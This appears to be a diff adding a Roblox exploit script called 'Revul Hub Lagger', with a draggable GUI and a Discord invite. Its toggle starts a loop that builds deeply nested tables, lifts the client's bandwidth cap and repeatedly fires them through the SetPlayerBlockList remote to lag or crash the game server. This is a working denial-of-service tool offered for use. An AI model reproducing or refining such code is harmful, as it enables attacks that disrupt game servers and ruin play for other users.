@@ -1,0 +1,180 @@
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local CoreGui = game:GetService("CoreGui")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local ScreenGui_1 = Instance.new("ScreenGui")
+ScreenGui_1.Name = "RevulHubLagger"
+ScreenGui_1.ResetOnSpawn = false
+ScreenGui_1.Parent = CoreGui
+local Frame_1 = Instance.new("Frame")
+Frame_1.Name = "Frame"
+Frame_1.ClipsDescendants = true
+Frame_1.Position = UDim2.new(0, 30, 0, 137)
+Frame_1.Size = UDim2.new(0, 160, 0, 100)
+Frame_1.Active = true
+Frame_1.Parent = ScreenGui_1
+local Gradient_1 = Instance.new("UIGradient")
+Gradient_1.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(106, 13, 173)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(75, 0, 130)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(106, 13, 173))
+})
+Gradient_1.Rotation = 254.574
+Gradient_1.Parent = Frame_1
+local Corner_1 = Instance.new("UICorner")
+Corner_1.Parent = Frame_1
+local Stroke_1 = Instance.new("UIStroke")
+Stroke_1.Color = Color3.fromRGB(40, 0, 80)
+Stroke_1.Thickness = 2
+Stroke_1.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+Stroke_1.Parent = Frame_1
+local TextLabel_1 = Instance.new("TextLabel")
+TextLabel_1.BackgroundTransparency = 1
+TextLabel_1.Position = UDim2.new(0, 8, 0, 4)
+TextLabel_1.Size = UDim2.new(1, -40, 0, 16)
+TextLabel_1.Font = Enum.Font.GothamBlack
+TextLabel_1.Text = "Revul Hub Lagger"
+TextLabel_1.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_1.TextSize = 12
+TextLabel_1.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel_1.Parent = Frame_1
+local TextLabel_2 = Instance.new("TextLabel")
+TextLabel_2.Name = "DiscordLink"
+TextLabel_2.BackgroundTransparency = 1
+TextLabel_2.Position = UDim2.new(0, 8, 0, 19)
+TextLabel_2.Size = UDim2.new(1, -40, 0, 12)
+TextLabel_2.Font = Enum.Font.GothamMedium
+TextLabel_2.Text = "discord.gg/revulhub"
+TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.TextTransparency = 0.4
+TextLabel_2.TextSize = 8
+TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel_2.Parent = Frame_1
+local TextButton_Minimize = Instance.new("TextButton")
+TextButton_Minimize.BackgroundColor3 = Color3.fromRGB(60, 10, 100)
+TextButton_Minimize.Position = UDim2.new(1, -26, 0, 5)
+TextButton_Minimize.Size = UDim2.new(0, 20, 0, 20)
+TextButton_Minimize.Font = Enum.Font.GothamBlack
+TextButton_Minimize.Text = "-"
+TextButton_Minimize.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_Minimize.TextSize = 12
+TextButton_Minimize.Parent = Frame_1
+Instance.new("UICorner", TextButton_Minimize).CornerRadius = UDim.new(0, 5)
+Instance.new("UIStroke", TextButton_Minimize).Color = Color3.fromRGB(40, 0, 80)
+local Frame_2 = Instance.new("Frame") -- Toggle Row
+Frame_2.BackgroundColor3 = Color3.fromRGB(30, 5, 50)
+Frame_2.BackgroundTransparency = 0.7
+Frame_2.Position = UDim2.new(0, 8, 0, 38)
+Frame_2.Size = UDim2.new(1, -16, 0, 32)
+Frame_2.Parent = Frame_1
+Instance.new("UICorner", Frame_2)
+Instance.new("UIStroke", Frame_2).Color = Color3.fromRGB(40, 0, 80)
+local TextLabel_3 = Instance.new("TextLabel")
+TextLabel_3.BackgroundTransparency = 1
+TextLabel_3.Position = UDim2.new(0, 8, 0, 0)
+TextLabel_3.Size = UDim2.new(1, -50, 1, 0)
+TextLabel_3.Font = Enum.Font.GothamMedium
+TextLabel_3.Text = "Enable Lagger"
+TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.TextSize = 11
+TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel_3.Parent = Frame_2
+local Frame_3 = Instance.new("Frame") -- Switch Background
+Frame_3.BackgroundColor3 = Color3.fromRGB(20, 3, 35)
+Frame_3.Position = UDim2.new(1, -38, 0.5, -7)
+Frame_3.Size = UDim2.new(0, 30, 0, 14)
+Frame_3.Parent = Frame_2
+Instance.new("UICorner", Frame_3).CornerRadius = UDim.new(0, 7)
+local Frame_4 = Instance.new("Frame") -- Switch Knob
+Frame_4.BackgroundColor3 = Color3.fromRGB(180, 80, 255)
+Frame_4.Position = UDim2.new(0, 2, 0.5, -5)
+Frame_4.Size = UDim2.new(0, 10, 0, 10)
+Frame_4.Parent = Frame_3
+Instance.new("UICorner", Frame_4).CornerRadius = UDim.new(0, 5)
+local TextButton_Toggle = Instance.new("TextButton")
+TextButton_Toggle.BackgroundTransparency = 1
+TextButton_Toggle.Size = UDim2.new(1, 0, 1, 0)
+TextButton_Toggle.Text = ""
+TextButton_Toggle.Parent = Frame_2
+local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled
+local LAGGER_CONFIG = isMobile and {TableIncrease = 290, Tries = 1, LoopWaitTime = 0.85} or {TableIncrease = 265, Tries = 1, LoopWaitTime = 0.05}
+local CUSTOM_REMOTE_PATH = "RobloxReplicatedStorage.SetPlayerBlockList"
+local function resolveRemote(path)
+    local obj = game
+    for segment in path:gsub("^game%.", ""):gmatch("[^%.]+") do
+        if obj then obj = obj[segment] else return nil end
+    end
+    return obj
+end
+local function bomb(tableincrease, tries)
+    local maintable, spammedtable = {}, {{}}
+    local z = spammedtable[1]
+    for i = 1, tableincrease do
+        local tableins = {}
+        table.insert(z, tableins)
+        z = tableins
+    end
+    local maximum = 499999 / (tableincrease + 2)
+    for i = 1, maximum do
+        table.insert(maintable, spammedtable)
+        if i % 5000 == 0 then task.wait() end
+    end
+    local remote = resolveRemote(CUSTOM_REMOTE_PATH)
+    if remote then
+        for i = 1, tries do
+            pcall(function() remote:FireServer(maintable) end)
+        end
+    end
+end
+local laggerEnabled = false
+local laggerThread = nil
+local function toggleLaggerLoop(state)
+    laggerEnabled = state
+    if state then
+        laggerThread = task.spawn(function()
+            while laggerEnabled do
+                game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+                bomb(LAGGER_CONFIG.TableIncrease, LAGGER_CONFIG.Tries)
+                task.wait(math.max(LAGGER_CONFIG.LoopWaitTime, 0.15))
+            end
+        end)
+    else
+        if laggerThread then task.cancel(laggerThread) laggerThread = nil end
+    end
+end
+local dragging, dragStart, startPos
+Frame_1.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true dragStart = input.Position startPos = Frame_1.Position
+    end
+end)
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - dragStart
+        Frame_1.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = false end
+end)
+RunService.RenderStepped:Connect(function()
+    Gradient_1.Rotation = (Gradient_1.Rotation + 0.8) % 360
+end)
+local minimized = false
+TextButton_Minimize.MouseButton1Click:Connect(function()
+    minimized = not minimized
+    local targetSize = minimized and UDim2.new(0, 160, 0, 35) or UDim2.new(0, 160, 0, 100)
+    TextButton_Minimize.Text = minimized and "+" or "-"
+    TweenService:Create(Frame_1, TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = targetSize}):Play()
+end)
+TextButton_Toggle.MouseButton1Click:Connect(function()
+    laggerEnabled = not laggerEnabled
+    local knobPos = laggerEnabled and UDim2.new(1, -12, 0.5, -5) or UDim2.new(0, 2, 0.5, -5)
+    local switchCol = laggerEnabled and Color3.fromRGB(60, 20, 100) or Color3.fromRGB(20, 3, 35)
+    TweenService:Create(Frame_4, TweenInfo.new(0.2), {Position = knobPos}):Play()
+    TweenService:Create(Frame_3, TweenInfo.new(0.2), {BackgroundColor3 = switchCol}):Play()
+    toggleLaggerLoop(laggerEnabled)
+end)
+print("REVUL HUB LAGGER")
